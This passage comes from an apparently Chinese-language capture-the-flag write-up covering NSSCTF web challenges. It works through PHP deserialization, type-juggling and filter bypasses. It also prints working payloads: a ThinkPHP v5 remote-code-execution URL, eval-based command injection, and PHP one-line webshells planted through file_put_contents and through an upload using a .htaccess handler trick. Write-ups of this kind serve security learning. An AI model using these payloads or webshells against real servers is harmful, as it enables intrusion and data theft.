class="keyword">__FILE__</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;x = <span class="keyword">__FILE__</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;x);</span><br><span class="line">        <span class="comment">//flag is in fllllllag.php</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;x&#x27;</span>])) &#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;x&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里主要考查的是wakeup魔法函数的绕过，我们之前在2021的新生题里面碰到过，就是让序列化的个数和实际不符的时候就回跳过<br>在 PHP 中，$_REQUEST 是一个超全局变量，用于获取通过多种方式（如 GET、POST、COOKIE）发送到脚本的数据。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">X</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$x</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">X</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; x = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line">O:<span class="number">1</span>:<span class="string">&quot;X&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;x&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></div>

<p>O:&lt;类名长度&gt;:”&lt;类名&gt;”:&lt;成员数量&gt;:{&lt;成员&gt;} 把成员数量改一下，绕过wakeup函数<br><img src="https://pic1.imgdb.cn/item/67b1f44ad0e0a243d4ffe0a0.png"></p>
<h1 id="where-am-i"><a href="#where-am-i" class="headerlink" title="where_am_i"></a>where_am_i</h1><p><img src="https://pic1.imgdb.cn/item/67b1f66cd0e0a243d4ffe11e.png"><br>源代码中有一句提示<code>什么东西是11位啊</code><br>ai了一下什么是11位的，知道手机号是11位的，但是还是不知道咋做<br>看了wp要去搜这个图然后查酒店的电话，有点逆天。。<br><img src="https://pic1.imgdb.cn/item/67b1f9e6d0e0a243d4ffe183.png"><br>成都的古迹酒店，填入电话</p>
<h1 id="ez-rce"><a href="#ez-rce" class="headerlink" title="ez_rce"></a>ez_rce</h1><p>题目</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">真的什么都没有吗？</span><br></pre></td></tr></table></figure>
<p>发现有robots.txt文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NESTEDTEXT"><figure class="iseeu highlight /nestedtext"><table><tr><td class="code"><pre><span class="line"><span class="attribute">User-agent</span><span class="punctuation">:</span> <span class="string">*</span></span><br><span class="line"><span class="attribute">Disallow</span><span class="punctuation">:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string"> /NSS/index.php/</span></span><br></pre></td></tr></table></figure></div>
<p><img src="https://pic1.imgdb.cn/item/67b1fbc0d0e0a243d4ffe1cd.png"><br>访问之后的界面。所以去搜下thinkphp v5漏洞 找到rce漏洞</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">/index.php?s=index/think\app/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=<span class="built_in">whoami</span></span><br></pre></td></tr></table></figure></div>
<p>修改最后的值就能执行任意命令了<br>下面省略了前面的，只有命令</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TCL"><figure class="iseeu highlight /tcl"><table><tr><td class="code"><pre><span class="line">ls /</span><br><span class="line">bin boot dev etc flag home lib lib64 media mnt nss opt <span class="keyword">proc</span><span class="title"> root</span> run<span class="title"> sbin</span> srv<span class="title"> sys</span> tmp<span class="title"> usr</span> var<span class="title"> var</span> 好熟悉的界面 似曾相识啊<span class="title"></span></span><br><span class="line"><span class="title"></span></span><br><span class="line"><span class="title">cat</span> /flag</span><br><span class="line">好熟悉的界面 似曾相识啊  #说明是文件夹</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>这里flag是空的，那就用蚁剑连接去找，写一个一句话木马</p>
<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][]=</span><span class="language-php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]); <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>这里将一句话木马写入文件shell.php<br><img src="https://pic1.imgdb.cn/item/67b1ff0ad0e0a243d4ffe262.png"><br><img src="https://pic1.imgdb.cn/item/67b1ff7ad0e0a243d4ffe26c.png"><br>在nss目录下找到flag</p>
<h1 id="funny-php"><a href="#funny-php" class="headerlink" title="funny_php"></a>funny_php</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>])&lt;=<span class="number">3</span>&amp;&amp;<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]&gt;<span class="number">999999999</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;:D&quot;</span>;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;L1&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;:C&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/NSSCTF/&#x27;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$str</span> === <span class="string">&quot;NSSCTF&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;wow&quot;</span>;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;L2&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md5_1&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md5_2&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md5_1&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;md5_2&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md5_1&#x27;</span>])==<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md5_2&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Nice!&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md5_1&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md5_2&#x27;</span>]))&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md5_1&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">is_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md5_2&#x27;</span>]))&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;yoxi!&quot;</span>;</span><br><span class="line">                    <span class="variable">$_SESSION</span>[<span class="string">&#x27;L3&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;X(&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;G&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$_POST</span>[<span class="string">&#x27;md5_1&#x27;</span>].<span class="string">&quot;\n&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;md5_2&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;L1&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;L2&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;L3&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>这里最后就是要把<code>L1</code> <code>L2</code> <code>L3</code>都设置就可以得到flag</p>
<ol>
<li>L1<br>只能三个字符，但是数值要大于999999999，所以用科学计数法2e9</li>
<li>L2<br>这里preg_replace把敏感词置换为空，所以我们可用双写<code>NSSNSSCTFCTF</code>,这样子中间的NSSCTF就不会显示</li>
<li>L3<br>又是考查一样的md5，但是这里要求两个都是纯字母<br>所以可以选<code>EEIZDOI</code> <code>QLTHNDT</code><br><img src="https://pic1.imgdb.cn/item/67b204f4d0e0a243d4ffe2e0.png"></li>
</ol>
<h1 id="funny-web"><a href="#funny-web" class="headerlink" title="funny_web"></a>funny_web</h1><p><img src="https://pic1.imgdb.cn/item/67b2dabed0e0a243d40024e3.png"><br><img src="https://pic1.imgdb.cn/item/67b2dad1d0e0a243d40024e8.png"><br>直接从web这边入手不知道这个实验室名到底是什么意思<br>目录扫描了一下也没有发现其他的目录，只能看wp得到用户密码<br>用户 NSS，密码 2122693401<br>得到题目</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$num</span> != <span class="string">&#x27;12345&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>) == <span class="string">&#x27;12345&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;这为何相等又不相等&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这里要了解php的intval()函数，<br>intval() 是 PHP 的一个函数，它用于将变量转换为整数（integer）。它的基本用法如下：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">intval</span>(<span class="keyword">mixed</span> <span class="variable">$value</span>, <span class="keyword">int</span> <span class="variable">$base</span> = <span class="number">10</span>): <span class="keyword">int</span></span><br></pre></td></tr></table></figure></div>
<p>$value（必需）：要转换的值，可以是字符串、浮点数、布尔值等。<br>$base（可选）：进制，默认为 10。仅当 $value 是字符串时有效，可用于转换不同进制的数字（如二进制、十六进制）。<br>这里有多种方法可以绕过inval函数，可以用小数点，字符等<br><img src="https://pic1.imgdb.cn/item/67b2dc5ad0e0a243d4002585.png"></p>
<h1 id="webdog1-start"><a href="#webdog1-start" class="headerlink" title="webdog1__start"></a>webdog1__start</h1><p>题目</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Do</span> you really reading <span class="keyword">to</span> <span class="keyword">start</span> be a web dog? <span class="keyword">DO</span> you think you go here <span class="keyword">from</span> <span class="keyword">where</span>?</span><br><span class="line">are you readying <span class="keyword">to</span> <span class="keyword">start</span>?</span><br></pre></td></tr></table></figure></div>
<p>页面源代码中有提示</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">if (isset($_GET[&#x27;web&#x27;]))</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    $first=$_GET[&#x27;web&#x27;];</span></span><br><span class="line"><span class="comment">    if ($first==md5($first)) </span></span><br><span class="line"><span class="comment">     </span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>然后去&#x2F;robots.txt中，看到有一个f14g.php文件的地址，访问之后还是没有什么别的信息<br>看了wp才知道要去f12网络中的标头找到hint。。。。。<br>然后找到真正的题目地址<code>F1l1l1l1l1lag.php</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;get&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strstr</span>(<span class="variable">$get</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot; &quot;</span>, <span class="variable">$get</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$get</span>)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;This is too long.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$get</span>);</span><br><span class="line">          &#125; </span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>这里过滤了空格，然后把flag替换成空格<br>这里有两种方法，第一种是用%09也就是制表符&#x2F;t代替空格<br><code>?get=system(&#39;cat%09/*&#39;)</code>这里只能把根目录下面所有的内容都打印出来，不过这里也就只有flag了<br>法二，题目是执行<code>get</code>的内容，但是我们可以让这个get再去执行我们自己设置的一个参数</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MEL"><figure class="iseeu highlight /mel"><table><tr><td class="code"><pre><span class="line">?get=<span class="keyword">eval</span>($_GET[<span class="string">&#x27;a&#x27;</span>]);&amp;a=<span class="keyword">system</span>(<span class="string">&quot;cat /flag&quot;</span>);</span><br></pre></td></tr></table></figure></div>
<p>这里要注意一下第一个get参数赋值完之后要写一个<code>;</code>,这样子这句话中的eval语句才结束，然后被外面一层eval识别。</p>
<h1 id="Ez-upload"><a href="#Ez-upload" class="headerlink" title="Ez_upload"></a>Ez_upload</h1><p><img src="https://pic1.imgdb.cn/item/67b30478d0e0a243d4003c84.png"><br>一道上传文件的题目，我先上传了一个一句话木马，出现<code>后缀名不能有ph！</code>,这里如果是说不能是php我们就可以用不同的php后缀名，比如php3 php5 phtml等绕过。<br>这里先改后缀上传，然后用bp修改后缀看看，这里也不是在前端就校验，所以还是不行<br>首先是 如果直接上传普通的一句话木马，给出的错误是不能有ph<br>然后是抓包修改文件类型,还是提示提示不能有ph，所以是在后端做的校验，直接上传jpg文件<br>发现显示，还是换个类型吧，但是真的jpg这个类型不可以吗，我把文件的内容删掉，再上传<br>发现可以成功上传，难道是eval这个函数的或者POST之类的被过滤了，现在把<code>&lt;?php ?&gt;</code>删去，上传剩下的eval部分的内容的jpg文件  –&gt;成功上传<br>那就说明了是<code>&lt;?php ?&gt; </code>的问题了，到这我们就知道要用script版本的一句话木马了<br>所以最后.htaccess配置文件的方式，让上传的jpg文件解析成php文件。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span><span class="language-javascript">@<span class="built_in">eval</span>($_POST[<span class="string">&#x27;a&#x27;</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="section">&lt;FilesMatch <span class="string">&quot;1.jpg&quot;</span>&gt;</span></span><br><span class="line">    <span class="attribute">SetHandler</span> application/x-httpd-php</span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>这个文件就是apache服务器里面文件夹下的1.jpg都解析成php文件<br>然后要用bp抓包上传这个文件，把content-type修改一下<br><img src="https://pic1.imgdb.cn/item/67b2f4aed0e0a243d4002fc8.png"><br>然后就可以用蚁剑连接了，但是这里的flag是空的<br><img src="https://pic1.imgdb.cn/item/67b2ffc6d0e0a243d400383d.png"><br>如果在根目录下没有flag那基本就是在环境变量或者phpinfo里面<br>在蚁剑的虚拟终端里面输入php -i就可以查看php的信息了包括环境变量，然后找到了flag<br><img src="https://pic1.imgdb.cn/item/67b3006dd0e0a243d40039c5.png"></p>
<h1 id="numgame"><a href="#numgame" class="headerlink" title="numgame"></a>numgame</h1><p><img src="https://pic1.imgdb.cn/item/67b304e8d0e0a243d4003cb2.png"><br>题目描述：简简单单的迷惑游戏<br>但是用f12和右键都不能看源代码，那就在url中加上<code>view-source:</code>就能看源代码<br><img src="https://pic1.imgdb.cn/item/67b3066ed0e0a243d4003d4e.png"><br>点击链接跳转到题目代码界面</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LUA"><figure class="iseeu highlight /lua"><table><tr><td class="code"><pre><span class="line">var <span class="built_in">input</span> = $(<span class="string">&#x27;input&#x27;</span>),</span><br><span class="line">    input_val = parseInt(<span class="built_in">input</span>.val()),</span><br><span class="line">    btn_add = $(<span class="string">&#x27;.add&#x27;</span>),</span><br><span class="line">    btn_remove = $(<span class="string">&#x27;.remove&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span>.keyup(<span class="function"><span class="keyword">function</span><span class="params">()</span></span> &#123;</span><br><span class="line">    input_val = parseInt(<span class="built_in">input</span>.val())</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">btn_add.click(<span class="function"><span class="keyword">function</span><span class="params">(e)</span></span> &#123;</span><br><span class="line">    input_val++;</span><br><span class="line">    <span class="built_in">input</span>.val(input_val);</span><br><span class="line">    console.<span class="built_in">log</span>(input_val);</span><br><span class="line">    <span class="keyword">if</span>(input_val==<span class="number">18</span>)&#123;</span><br><span class="line">        input_val=<span class="number">-20</span>;</span><br><span class="line">        <span class="built_in">input</span>.val(<span class="number">-20</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">btn_remove.click(<span class="function"><span class="keyword">function</span><span class="params">(e)</span></span> &#123;</span><br><span class="line">    input_val<span class="comment">--;</span></span><br><span class="line">    <span class="built_in">input</span>.val(input_val);</span><br><span class="line">&#125;);</span><br><span class="line">// NSSCTF&#123;TnNTY1RmLnBocA==&#125;</span><br></pre></td></tr></table></figure></div>
<p>先用base64解码一下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="built_in">echo</span> TnNTY1RmLnBocA== | <span class="built_in">base64</span> -d</span><br><span class="line">NsScTf.php  </span><br></pre></td></tr></table></figure></div>
<p>果然不会这么好心直接给flag </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//hint: 与get相似的另一种请求协议是什么呢</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nss</span></span>&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">ctf</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&quot;./hint2.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/n|c/m&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>], <span class="variable">$matches</span>))</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这个hint的意思就是POST了<br>PHP 中的 <code>call_user_func()</code>函数：<br>call_user_func() 是 PHP 的一个回调函数调用方法，它可以用于 动态调用函数 或 类的方法，即在运行时决定要执行哪个函数，而不是在代码编写时就固定。<br>这里用到call_user_func()中的调用类的方法  例子：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PERL"><figure class="iseeu highlight /perl"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    static function sayHello(<span class="variable">$name</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello, <span class="variable">$name</span>!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo call_user_func([<span class="string">&quot;Demo&quot;</span>, <span class="string">&quot;sayHello&quot;</span>], <span class="string">&quot;Alice&quot;</span>); </span><br></pre></td></tr></table></figure></div>
<p>所以传入一个数组，数组中的第一个值时类名，第二个是调用的静态方法名</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">?p[<span class="number">0</span>]=nss&amp;p[<span class="number">1</span>]=ctf</span><br><span class="line">有没有一种可能，类是nss2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?p[<span class="number">0</span>]=nss2&amp;p[<span class="number">1</span>]=ctf</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$flag</span>=<span class="string">&quot;NSSCTF&#123;ae335328-f4f3-443f-a850-22d5f617a7b8&#125;&quot;</span>;</span><br></pre></td></tr></table></figure></div>
<p>在注释中找到flag</p>
<h1 id="xff"><a href="#xff" class="headerlink" title="xff"></a>xff</h1><p>题目</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MIZAR"><figure class="iseeu highlight /mizar"><table><tr><td class="code"><pre><span class="line">Must <span class="keyword">be</span> accessed <span class="keyword">from</span> Xiaohong&#x27;s own computer.</span><br></pre></td></tr></table></figure></div>
<p>估计就是考X-Forwarded-for了<br><img src="https://pic1.imgdb.cn/item/67b321dfd0e0a243d400462e.png"><br>修改请求头加上X-Forwarded-For: 127.0.0.1</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line">Must be jump <span class="selector-tag">from</span> Home <span class="attribute">Page</span>.</span><br></pre></td></tr></table></figure></div>
<p><img src="https://pic1.imgdb.cn/item/67b32278d0e0a243d400464a.png"><br>这个<code>from</code>就是告诉我们还要添加Refer 拿到flag</p>
<h1 id="js-sign"><a href="#js-sign" class="headerlink" title="js_sign"></a>js_sign</h1><p><img src="https://pic1.imgdb.cn/item/67b322edd0e0a243d4004662.png"><br>只有一个输入框，如果输入错误会有一个弹窗<br>进行目录扫描，发现一个地址</p>
